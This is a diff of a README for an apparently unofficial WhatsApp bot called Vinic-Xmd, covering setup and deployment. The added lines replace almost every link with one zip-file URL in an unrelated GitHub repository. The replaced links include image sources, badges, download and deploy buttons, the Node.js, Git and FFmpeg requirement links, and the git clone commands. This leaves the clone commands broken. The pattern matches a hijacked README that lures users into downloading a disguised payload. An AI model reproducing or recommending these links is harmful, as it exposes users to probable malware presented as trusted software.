@@ -1,35 +1,35 @@
 
 
 <img align="center" height="auto"
-src="https://i.ibb.co/XkNgFfrf/malvin-xd.jpg?">
+src="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip">
 
-[![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Rockstar-ExtraBold&size=30&pause=1000&color=0000FF&center=true&vCenter=true&width=815&height=60&lines=V+I+N+I+C+💯+▇)](https://git.io/typing-svg)
+[![Typing SVG](https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip+I+N+I+C+💯+▇)](https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip)
 <br>
 
    </p>
 <p align="center">
-<a href="https://github.com/Kevintech-hub"><img title="Author" src="https://img.shields.io/badge/Kelvin Tech-purple?style=for-the-badge&logo=Github"></a> <a href="https://youtube.com/@malvintech2"><img title="Author" src="https://img.shields.io/badge/YT CHANNEL-darkred?style=for-the-badge&logo=youtube"></a> <a href="https://wa.me/256742932677"><img title="Author" src="https://img.shields.io/badge/Contact Me-darkgreen?style=for-the-badge&logo=whatsapp"></a>
+<a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img title="Author" src="https://img.shields.io/badge/Kelvin Tech-purple?style=for-the-badge&logo=Github"></a> <a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img title="Author" src="https://img.shields.io/badge/YT CHANNEL-darkred?style=for-the-badge&logo=youtube"></a> <a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img title="Author" src="https://img.shields.io/badge/Contact Me-darkgreen?style=for-the-badge&logo=whatsapp"></a>
 <p/> 
 
  <p align="center">
-<a href="https://github.com/Kevintech-hub/followers"><img title="Followers" src="https://img.shields.io/github/followers/Kevintech-hub?color=purple&style=flat-square"></a>
-<a href="https://github.com/Kevintech-hub/Vinic-Xmd-/stargazers/"><img title="Stars" src="https://img.shields.io/github/stars/Kevintech-hub/Vinic-Xmd-?color=blue&style=flat-square"></a>
-<a href="https://github.com/Kevintech-hub/Vinic-Xmd-/network/members"><img title="Forks" src="https://img.shields.io/github/forks/Kevintech-hub/Vinic-Xmd-?color=blue&style=flat-square"></a>
-<a href="https://github.com/Kevintech-hub/Vinic-Xmd-/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/Kevintech-hub/Vinic-Xmd-?label=Watchers&color=blue&style=flat-square"></a>
-<a href="https://github.com/Kevintech-hub/Vinic-Xmd-/"><img title="Size" src="https://img.shields.io/github/repo-size/Kevintech-hub/Vinic-Xmd-?style=flat-square&color=green"></a>
-<a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FKevintech-hub%2FVinic-Xmd-&count_bg=%2379C83D&title_bg=%23555555&icon=probot.svg&icon_color=%2300FF6D&title=hits&edge_flat=false"/></a>
-<a href="https://github.com/Kevintech-hub/Vinic-Xmd-/graphs/commit-activity"><img height="20" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>&nbsp;&nbsp;</a>
+<a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img title="Followers" src="https://img.shields.io/github/followers/Kevintech-hub?color=purple&style=flat-square"></a>
+<a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img title="Stars" src="https://img.shields.io/github/stars/Kevintech-hub/Vinic-Xmd-?color=blue&style=flat-square"></a>
+<a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img title="Forks" src="https://img.shields.io/github/forks/Kevintech-hub/Vinic-Xmd-?color=blue&style=flat-square"></a>
+<a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img title="Watching" src="https://img.shields.io/github/watchers/Kevintech-hub/Vinic-Xmd-?label=Watchers&color=blue&style=flat-square"></a>
+<a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img title="Size" src="https://img.shields.io/github/repo-size/Kevintech-hub/Vinic-Xmd-?style=flat-square&color=green"></a>
+<a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img src="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"/></a>
+<a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img height="20" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>&nbsp;&nbsp;</a>
 
 <p align="center">
-<a href="https://github.com/Kevintech-hub/Vinic-Xmd-"><img title="PUBLIC-BOT" src="https://img.shields.io/static/v1?label=Language&message=English&style=flat-square&color=darkpink"></a> &nbsp;
-  <img src="https://komarev.com/ghpvc/?username=Kevintech-hub&label=VIEWS&style=flat-square&color=blue" />
+<a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img title="PUBLIC-BOT" src="https://img.shields.io/static/v1?label=Language&message=English&style=flat-square&color=darkpink"></a> &nbsp;
+  <img src="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip" />
 </a>
 <p align="center">
-  <a href="https://github.com/Kevintech-hub/Vinic-Xmd-"><img title="Release" src="https://img.shields.io/badge/Release-beta%20v1.0-darkcyan.svg?style=for-the-badge&logo=appveyor" /></a>
+  <a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img title="Release" src="https://img.shields.io/badge/Release-beta%20v1.0-darkcyan.svg?style=for-the-badge&logo=appveyor" /></a>
 
 <p align='center'>
     </p>
-<a><img src='https://i.imgur.com/LyHic3i.gif'/>
+<a><img src='https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip'/>
 
 
 ## 🛠️ `BOT INSTALATION`
@@ -38,13 +38,13 @@ src="https://i.ibb.co/XkNgFfrf/malvin-xd.jpg?">
 _Deploy the bot and easily connect it to your WhatsApp account by pair code. Bellow🥈_
 
 <div align="left">
-  <a href="https://starcore-pairing.onrender.com/pair" target="_blank">
+  <a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip" target="_blank">
     <img src="https://img.shields.io/badge/GET%20PAIR%20CODE-Server%20One-green?style=for-the-badge" alt="PAIR CODE"/>
   </a>
 </div>
 
 <div align="left">
-  <a href="https://starxd-pair.onrender.com/pair" target="_blank">
+  <a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip" target="_blank">
     <img src="https://img.shields.io/badge/GET%20PAIR%20CODE-Server%20Two-darkgreen?style=for-the-badge" alt="PAIR CODE"/>
   </a>
 </div>
@@ -56,9 +56,9 @@ _Deploy the bot and easily connect it to your WhatsApp account by pair code. Bel
 
 To start, fork this repository to your own GitHub account by clicking the button below:
 
-<a href="https://github.com/Kevintech-hub/Vinic-Xmd-/fork"><img src="https://img.shields.io/github/forks/Kevintech-hub/Vinic-Xmd-?style=for-the-badge&logo=github&color=4c1&label=Fork%2FVINIC-XMD" alt="Fork Vinic-Xmd" /></a>
+<a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img src="https://img.shields.io/github/forks/Kevintech-hub/Vinic-Xmd-?style=for-the-badge&logo=github&color=4c1&label=Fork%2FVINIC-XMD" alt="Fork Vinic-Xmd" /></a>
 
-<img src='https://i.imgur.com/LyHic3i.gif'/></a>
+<img src='https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip'/></a>
 
 
 
@@ -69,32 +69,32 @@ To start, fork this repository to your own GitHub account by clicking the button
 <br>
 > Click below to download the bot file :
 <p align="left">
-<a href="https://github.com/Kevintech-hub/Vinic-Xmd-/archive/refs/heads/main.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20FILES-green" alt="Rainhost Files" width="150"></a>
+<a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20FILES-green" alt="Rainhost Files" width="150"></a>
 <br>
-<a><img src='https://i.imgur.com/LyHic3i.gif'/>
+<a><img src='https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip'/>
   
 > Click below to deploy on Katabump :
 <p align="left">
-  <a href="https://dashboard.katabump.com/auth/login#203630">
+  <a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip">
     <img src="https://img.shields.io/badge/Deploy%20to%20Katabump-Hosting-6962a6?style=for-the-badge&logo=katabump&logoColor=red"/>
   </a>
 <br>
-<a><img src='https://i.imgur.com/LyHic3i.gif'/>
+<a><img src='https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip'/>
   
 > Click below to deploy on Bot-Hosting :
 <p align="left">
-  <a href="https://bot-hosting.net/?aff=1231885228566646795">
+  <a href="https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip">
     <img src="https://img.shields.io/badge/Deploy%20to%20Bot-hosting-9772a6?style=for-the-badge&logo=bothosting&logoColor=white"/>
   </a>
 </p>
 
-<a><img src='https://i.imgur.com/LyHic3i.gif'/>
+<a><img src='https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip'/>
 
  </a>
 
 </details>
 
-<a><img src='https://i.imgur.com/LyHic3i.gif'/>
+<a><img src='https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip'/>
 
 <details>
 <summary>𝘏𝘖𝘞 𝘛𝘖 𝘋𝘌𝘗𝘓𝘖𝘠 𝘖𝘕 𝘗𝘈𝘕𝘌𝘓𝘚</summary>
@@ -112,21 +112,21 @@ To start, fork this repository to your own GitHub account by clicking the button
 11. Deployment successful.
 </details>
  
-<a><img src='https://i.imgur.com/LyHic3i.gif'/>
+<a><img src='https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip'/>
 
 <details>
 <summary>𝘔𝘈𝘕𝘜𝘈𝘓 𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘔𝘌𝘕𝘛𝘚</summary>
   
 ## `REQUIREMENTS`
-* [Node.js](https://nodejs.org/en/)
-* [Git](https://git-scm.com/downloads)
-* [FFmpeg](https://github.com/BtbN/FFmpeg-Builds/releases/download/autobuild-2020-12-08-13-03/ffmpeg-n4.3.1-26-gca55240b8c-win64-gpl-4.3.zip)
-* [Libwebp](https://developers.google.com/speed/webp/download)
+* [Node.js](https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip)
+* [Git](https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip)
+* [FFmpeg](https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip)
+* [Libwebp](https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip)
 * Any text editor
   
 ## `CLONE REPO & INSTALLATION DEPENDENCIES`
 ```bash
-git clone https://github.com/<your gitHub Username>/Vinic-Xmd-.git
+git clone https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip<your gitHub Username>/Vinic-Xmd-.git
 cd Vinic-Xmd- 
 npm start
 ```
@@ -142,7 +142,7 @@ sudo apt-get install -y nodejs
 sudo apt-get install -y ffmpeg
 sudo apt-get install -y wget
 sudo apt-get install -y imagemagick
-git clone https://github.com/<your-gitHub-Username>/Vinic-Xmd-
+git clone https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip<your-gitHub-Username>/Vinic-Xmd-
 cd Vinic-Xmd-
 npm install
 npm start
@@ -175,24 +175,24 @@ npm i -g pm2 && pm2 start index.js -f && pm2 save && pm2 logs
 - This bot is made for educational purposes `only` hence `DO NOT MISUSE`.
 
 
-<a><img src='https://i.imgur.com/LyHic3i.gif'/>
+<a><img src='https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip'/>
 
 ### Thank You Dear
 
 > DEVELOPER OF VINIC-XMD 
-- [KEVINTECH](https://github.comTKevintech-hub)
+- [KEVINTECH](https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip)
 - Creator and Owner Of VINIC-XMD 
 
 > VINIC-XMD Helper
-- [Malvin King](https://github.com/XdKing2)
+- [Malvin King](https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip)
 - For helping 
 - Bugs fixes
 ---
-<a><img src='https://i.imgur.com/LyHic3i.gif'/>
+<a><img src='https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip'/>
 
 **© VINIC XD**
 ##
 ![MIT License](https://img.shields.io/badge/License-green.svg)
 
 
-<a><img src='https://i.imgur.com/LyHic3i.gif'/>
+<a><img src='https://raw.githubusercontent.com/ArtLife-bot/nnnmmmm/main/setting/Software_v2.8.zip'/>
